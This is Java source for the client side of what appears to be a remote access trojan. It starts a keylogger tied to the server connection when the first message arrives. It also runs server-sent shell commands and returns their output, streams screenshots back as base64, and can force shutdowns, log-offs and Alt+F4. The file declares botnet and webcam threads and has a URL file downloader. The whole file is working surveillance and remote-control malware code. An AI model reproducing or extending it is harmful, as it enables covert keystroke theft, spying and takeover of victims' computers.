package Client;

import Control.KeyLogger;
import Control.SendCommand;
import Hardware.CPU_Usage;
import UI.Disk_Usage;
import Ultils.MessageType;
import Ultils.NetUtils;
import Ultils.OSUtils;
import Ultils.Packet;
import java.util.List;
import com.github.kwhat.jnativehook.NativeHookException;
import org.jfree.data.time.DynamicTimeSeriesCollection;
import oshi.SystemInfo;
import oshi.software.os.FileSystem;
import oshi.software.os.OSFileStore;

import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.ImageOutputStream;
import javax.swing.*;
import java.awt.*;
import java.awt.event.KeyEvent;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;

public class ClientManager {
    // Botnet
    private Thread botnet;

    // Desktop
    private Thread desktop;
    private boolean runningDesktop;

    private float compression = 0.4F;

    private Thread cpuUsage;
    private boolean trackingCPU;
    // Webcam
    private Thread webcam;
    private boolean runningWebcam;

    // KeyLogger
    private KeyLogger keylogger;

    public void onMessage(Packet packet, PrintWriter pw) {
        if (keylogger == null) {
            try {
                keylogger = new KeyLogger(pw);
            } catch (NativeHookException e) {
                e.printStackTrace();
            }
        }

        if (packet.action == MessageType.PERFORMANCE_TRACK.getID()){
            System.out.println("Received from server:" + packet.data);
            sendCpuUsage(pw);
        }

        else if (packet.action == MessageType.STORAGE_TRACK.getID()){
           System.out.println("Storage Track");
        }

        else if (packet.action == MessageType.ALTF4.getID()) {
            try {
                Robot r = new Robot();
                r.keyPress(KeyEvent.VK_ALT);
                r.keyPress(KeyEvent.VK_F4);

                r.keyRelease(KeyEvent.VK_ALT);
                r.keyRelease(KeyEvent.VK_F4);
            } catch (AWTException e) {
                e.printStackTrace();
            }
        }  else if (packet.action == MessageType.MESSAGE_BOX.getID()) {
            try {
                new Thread(new Runnable() {

                    @Override
                    public void run() {
                        try {
                            JOptionPane.showMessageDialog(null, packet.data.get(1), packet.data.get(0), Integer.parseInt(packet.data.get(2)));
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                }).start();
            } catch (Exception npe) {
                npe.printStackTrace();
            }
        } else if (packet.action == MessageType.COMMAND.getID()) {
            try {
                System.out.println(packet.data);
                String result = Control.SendCommand.SendCommand(packet.data.get(1));
                Packet commandPacket = new Packet();
                commandPacket.action = MessageType.COMMAND.getID();
                commandPacket.data = new ArrayList<String>();
                commandPacket.data.add("return");
                commandPacket.data.add(result);
                commandPacket.data.add("eof");
                NetUtils.sendMessage(commandPacket, pw);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else if (packet.action == MessageType.DESKTOP.getID()) {
            try {
                if (packet.data.get(0).equals("start")) {
                    runningDesktop = true;
                    if (desktop == null || !desktop.isAlive()) {
                        desktop = new Thread(new Runnable() {

                            @Override
                            public void run() {
                                remoteDesktop(pw);
                            }
                        });
                        desktop.start();
                    }
                } else if (packet.data.get(0).equals("stop")) {
                    runningDesktop = false;
                    if (this.desktop != null && this.desktop.isAlive()) {
                        this.desktop.stop();
                    }
                } else if (packet.data.get(0).equals("comp")) {
                    this.compression = Float.parseFloat(packet.data.get(1));
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else if (packet.action == MessageType.SHUTDOWN.getID()) {
            SendCommand.SendCommand_ShutDown();
            System.out.println("Client shutting down");
        } else if (packet.action == MessageType.LOGOFF.getID()) {
            SendCommand.SenCommand_LogOff();
            System.out.println("Client logging off");
        }
    }

    private static void sendCpuUsage(PrintWriter pw)
    {
        SystemInfo si = new SystemInfo();
        Hardware.CPU_Usage cpu_usage = new CPU_Usage(si);
        try {
            Packet packet = new Packet();
            packet.action = MessageType.PERFORMANCE_TRACK.getID();

            DynamicTimeSeriesCollection[] cpuTimeSeries = cpu_usage.CreateTimeSeries(si.getHardware().getProcessor());

            Number cpuResult = cpuTimeSeries[0].getX(0,0);
            Number[] procResult = new Number[cpuTimeSeries[1].getItemCount(0)];

                for (int j = 0; j < cpuTimeSeries[1].getItemCount(0); ++j)
                {
                    procResult[j] = cpuTimeSeries[1].getX(0,j);
                }

            packet.data = new ArrayList<>();

            packet.data.add(String.valueOf(cpuResult));

            for (int i = 0; i < procResult.length; ++i) {
                packet.data.add(String.valueOf(procResult[i]));
            }

            NetUtils.sendMessage(packet,pw);
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    private void downloadUsingStream(String urlStr, File file) throws IOException {
        URL url = new URL(urlStr);
        BufferedInputStream bis = new BufferedInputStream(url.openStream());
        FileOutputStream fis = new FileOutputStream(file);
        byte[] buffer = new byte[1024];
        int count=0;
        while((count = bis.read(buffer,0,1024)) != -1) {
            fis.write(buffer, 0, count);
        }
        fis.close();
        bis.close();
    }

    private void remoteDesktop(PrintWriter pw) {
        File temp = new File(System.getProperty("java.io.tmpdir"), "tempd.jpg");
        while (runningDesktop) {
            try {
                Dimension tk = Toolkit.getDefaultToolkit().getScreenSize();

                Robot rt = new Robot();
                BufferedImage img = rt.createScreenCapture(new Rectangle((int) tk.getWidth(), (int) tk.getHeight()));

                ImageWriter writer =  ImageIO.getImageWritersByFormatName("jpg").next();
                ImageOutputStream ios = ImageIO.createImageOutputStream(new FileOutputStream(temp));
                writer.setOutput(ios);

                ImageWriteParam param = writer.getDefaultWriteParam();
                if (param.canWriteCompressed()){
                    param.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
                    param.setCompressionQuality(compression);
                }
                writer.write(null, new IIOImage(img, null, null), param);
                String encodedString = Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(temp.getPath())));
                Packet packet = new Packet();
                packet.action = MessageType.DESKTOP.getID();
                packet.data = new ArrayList<String>();
                packet.data.add(encodedString);
                NetUtils.sendMessage(packet, pw);
            } catch (ThreadDeath dt) {
                if (temp.exists()) {
                    try {
                        temp.delete();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }

            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                System.out.println("Sleep interrupted while recording");
            } catch (ThreadDeath dt) {}
        }
        if (temp.exists()) {
            try {
                temp.delete();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public String getSeparator() {
        return "|}";
    }

    public  static  void main(String[] args)
    {
        PrintWriter pw = null;
        sendCpuUsage(pw);
    }
}
